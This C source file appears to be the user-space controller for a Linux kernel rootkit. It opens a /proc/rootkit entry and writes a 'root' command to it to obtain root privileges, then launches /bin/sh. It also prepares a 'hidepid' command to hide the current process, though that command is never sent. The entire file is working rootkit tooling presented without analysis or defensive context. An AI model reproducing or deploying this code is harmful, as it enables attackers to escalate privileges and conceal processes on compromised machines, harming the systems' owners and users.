#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <math.h>
#define RTKIT_HIDEPID_CMD 	"hidepid"
#define RTKIT_GETROOTPERM_CMD	"root"


#define RTKIT_PROCFS_ENTRYNAME 	"/proc/rootkit"

#define CURRENT_PROCESS 1

#define BUF_SIZE 16

#define OPTS_STR "+:c"

int main(int argc,char **argv)
{
	char hidepid_cmd[BUF_SIZE];
	char unhidepid_cmd[BUF_SIZE];
	int opt,fd;
	pid_t cur_pid,hidden_pid,unhidden_pid;
	fd = open(RTKIT_PROCFS_ENTRYNAME,O_RDWR);
	while((opt = getopt(argc,argv,OPTS_STR)) != -1)
	{
		switch (opt)
		{
			case 'c':
				do{
		if (CURRENT_PROCESS)
		{
			cur_pid = getpid();
		}
		else
		{
			cur_pid = atoi(optarg);
		}
		memset(hidepid_cmd,0x0,BUF_SIZE);	
		sprintf(hidepid_cmd,RTKIT_HIDEPID_CMD"%d",cur_pid);
	}while(0) ;
	break;
		}
	}

	if (write(fd,RTKIT_GETROOTPERM_CMD,strlen(RTKIT_GETROOTPERM_CMD)) < 0)
		printf("[__ERROR__]");
	system("/bin/sh");
}
